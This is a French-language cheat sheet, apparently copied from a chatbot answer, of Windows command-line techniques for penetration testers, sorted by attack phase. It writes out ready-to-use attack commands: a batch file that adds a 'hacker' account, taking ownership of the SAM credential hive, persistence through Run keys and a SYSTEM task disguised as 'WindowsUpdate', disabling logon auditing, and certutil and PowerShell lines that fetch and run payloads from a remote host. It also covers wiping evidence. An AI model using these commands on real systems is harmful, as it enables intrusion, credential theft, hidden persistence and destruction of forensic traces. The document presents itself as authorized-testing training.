Les pentesters peuvent exploiter plusieurs commandes DOS (ou CMD sous Windows) pour diverses tâches lors d'un test de pénétration. Voici quelques-unes des commandes les plus courantes et utiles pour la reconnaissance, l'exploitation, et la post-exploitation :

1. Reconnaissance et Collecte d'Informations
  .ipconfig : Affiche la configuration IP du système, y compris les adresses IP, les sous-réseaux, les passerelles, et les serveurs DNS.
cmd/ Copier le code
ipconfig /all

  .ping : Vérifie la connectivité réseau avec une machine distante en envoyant des paquets ICMP.
cmd/ Copier le code
ping [adresse IP ou nom d'hôte]

  .tracert : Trace le chemin qu'un paquet emprunte pour atteindre une destination, utile pour cartographier un réseau.
cmd/ Copier le code
tracert [adresse IP ou nom d'hôte]

  .nslookup : Utilisé pour interroger les serveurs DNS pour obtenir des informations sur les adresses IP ou les noms de domaine.
cmd/ Copier le code
nslookup [nom de domaine]

  .netstat : Affiche les connexions réseau actives, les ports ouverts, et les statistiques du réseau. Utile pour identifier les services en écoute.
cmd/ Copier le code
netstat -an

  .systeminfo : Fournit des informations détaillées sur la configuration du système, y compris le nom de l'ordinateur, le système d'exploitation, les correctifs installés, etc.
cmd/ Copier le code
systeminfo

  .tasklist : Affiche tous les processus en cours d'exécution sur le système, y compris les PID (Process IDs).
cmd/ Copier le code
tasklist

  .net view : Affiche les partages réseau disponibles sur une machine distante ou locale.
cmd /Copier le code
net view \\[nom ou adresse IP de la machine]

  .net user : Liste les comptes utilisateurs sur le système, ou permet de gérer les comptes utilisateurs.
cmd/ Copier le code
net user

2. Escalade de Privilèges et Exploitation
  .runas : Permet d'exécuter une commande en tant qu'un autre utilisateur, souvent utilisé pour tenter d'exécuter des commandes avec des privilèges élevés.
cmd/ Copier le code
runas /user:[domaine\utilisateur] cmd.exe

  .at : Planifie une tâche à exécuter à un moment spécifique, parfois exploitable pour exécuter des tâches avec des privilèges élevés.
cmd/ Copier le code
at [heure] /interactive cmd.exe

  .schtasks : Crée, supprime ou interroge les tâches planifiées. Peut être utilisé pour planifier une tâche à exécuter avec des privilèges administratifs.
cmd/ Copier le code
schtasks /create /tn [nom de la tâche] /tr "[chemin de la commande]" /sc [schedule] /ru [utilisateur]

  .net localgroup : Permet de gérer les groupes d'utilisateurs locaux. Peut être utilisé pour ajouter un utilisateur à un groupe d'administrateurs.
cmd/ Copier le code
net localgroup Administrateurs [nom de l'utilisateur] /add

3. Post-Exploitation et Persistance
  .wmic : Interface de ligne de commande pour interagir avec Windows Management Instrumentation (WMI), utile pour collecter des informations système détaillées, exécuter des scripts, etc.
cmd/ Copier le code
wmic process list brief

  .reg : Permet de manipuler le registre Windows, ce qui peut être utilisé pour persister des modifications après une attaque.
cmd /Copier le code
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [nom] /d [chemin de la commande]

  .sc : Permet de créer, démarrer, arrêter, et configurer des services Windows. Peut être utilisé pour créer un service malveillant.
cmd/opier le code
sc create [nom du service] binpath= "[chemin de l'exécutable]"

  .echo et >> : Ces commandes peuvent être utilisées ensemble pour créer ou modifier des fichiers texte, y compris des scripts batch malveillants ou des fichiers de configuration.
cmd/ Copier le code
echo @echo off > C:\Windows\System32\malicious.bat
echo net user hacker P@ssw0rd /add >> C:\Windows\System32\malicious.bat

  .copy et move : Utilisés pour copier ou déplacer des fichiers, y compris des fichiers malveillants.
cmd/ Copier le code
copy C:\source\malware.exe C:\Windows\System32\

4. Nettoyage des Traces
  .del et erase : Supprime des fichiers ou dossiers, souvent utilisés pour nettoyer les traces après une intrusion.
cmd/ Copier le code
del /f /q C:\Windows\Temp\log.txt

  .cipher : Peut être utilisé pour écraser des données supprimées afin d'empêcher la récupération.
cmd/ Copier le code
cipher /w:C:\

  .auditpol : Modifie les politiques d'audit, pouvant être utilisé pour désactiver la journalisation des événements.
cmd/ Copier le code
auditpol /set /subcategory:"Logon" /success:disable /failure:disable

Ces commandes DOS sont puissantes et, lorsqu'elles sont utilisées par un pentester, peuvent fournir un accès significatif à un système cible ainsi que la capacité d'escalader des privilèges, d'implanter une persistance, et de nettoyer les traces d'une intrusion.

5. Déplacement Latéral et Pivoting
  .net use : Monte un partage réseau distant comme un lecteur local, utile pour accéder à des ressources partagées sur le réseau.
cmd/ Copier le code
net use Z: \\[nom_serveur]\[partage] /user:[utilisateur] [mot_de_passe]

  .wmic /node : Permet d'exécuter des commandes WMI sur des ordinateurs distants, ce qui est utile pour le déplacement latéral.
cmd/Copier le code
wmic /node:[adresse IP] process call create "cmd.exe /c [commande]"

  .psexec : (Avec Sysinternals) Outil pour exécuter des processus sur des systèmes distants, fréquemment utilisé pour le déplacement latéral.
cmd/ Copier le code
  psexec \\[nom_serveur] -u [utilisateur] -p [mot_de_passe] cmd.exe

6. Escalade de Privilèges Avancée
  .cacls : Modifie les permissions des fichiers ou répertoires, ce qui peut être exploité pour l'escalade de privilèges.
  cmd/ Copier le code
  cacls C:\Windows\System32\config /E /G [utilisateur]:F

  .takeown : Prend possession d'un fichier ou répertoire, permettant ainsi de modifier ou de supprimer des fichiers critiques.
cmd/ Copier le code
takeown /F C:\Windows\System32\config\SAM

  .icacls : Permet de modifier les listes de contrôle d'accès (ACL) sur des fichiers et dossiers, utile pour ajuster les permissions afin de permettre l'accès administrateur.

cmd/ Copier le code
icacls C:\Windows\System32\config\SAM /grant [utilisateur]:F

7. Techniques de Persistance Avancée
  .schtasks /create : Crée une tâche planifiée pour exécuter un script ou programme malveillant avec des privilèges élevés de manière récurrente.
cmd/ Copier le code
schtasks /create /sc daily /tn "WindowsUpdate" /tr "cmd.exe /c [script_malveillant]" /ru SYSTEM /f

  .reg add : Ajoute des entrées au registre, souvent utilisé pour créer des points de persistance en exécutant des programmes au démarrage.
cmd/ Copier le code
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v [nom] /d "[chemin_programme]" /f

  .bcdedit : Modifie les paramètres de démarrage du système, pouvant être utilisé pour contourner des contrôles de sécurité au démarrage.
cmd/ Copier le code
bcdedit /set {current} safeboot minimal

8. Manipulation des Services
  .net stop et net start : Arrête et démarre des services Windows, permettant de manipuler des services critiques pour installer ou masquer des processus malveillants.
cmd/Copier le code
net stop [nom_du_service]
net start [nom_du_service]

  .sc config : Reconfigure un service Windows pour modifier son comportement au démarrage, par exemple pour exécuter un fichier malveillant.
cmd/Copier le code
sc config [nom_du_service] binPath= "[chemin_du_fichier_malveillant]"

  .sc delete : Supprime un service Windows, utile pour éliminer des traces d'un service malveillant après usage.
cmd/Copier le code
sc delete [nom_du_service]

9. Utilisation des Outils Windows Natifs
  .certutil : Outil pour manipuler les certificats, mais peut aussi être utilisé pour télécharger des fichiers depuis une URL, souvent employé pour télécharger des payloads malveillants.
cmd /Copier le code
certutil -urlcache -split -f "http://example.com/payload.exe" payload.exe

  .powershell : Exécution de scripts PowerShell via CMD pour un large éventail d'actions malveillantes, y compris l'escalade de privilèges, le pivoting, et la persistance.
cmd/ Copier le code
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://example.com/payload.ps1' -OutFile 'C:\payload.ps1'; & C:\payload.ps1"

  .wmic process : Commande pour lancer ou manipuler des processus à distance, utile pour contrôler des systèmes distants via WMI.
cmd/ Copier le code
wmic process call create "cmd.exe /c [commande]"

Ces commandes sont des outils puissants dans l'arsenal d'un pentester, permettant d'exécuter une variété de tâches critiques, depuis la reconnaissance initiale jusqu'à la persistance après l'exploitation d'un système cible. Cependant, leur utilisation doit toujours être effectuée dans un cadre légal et éthique, comme lors de tests de pénétration autorisés ou dans un environnement contrôlé.







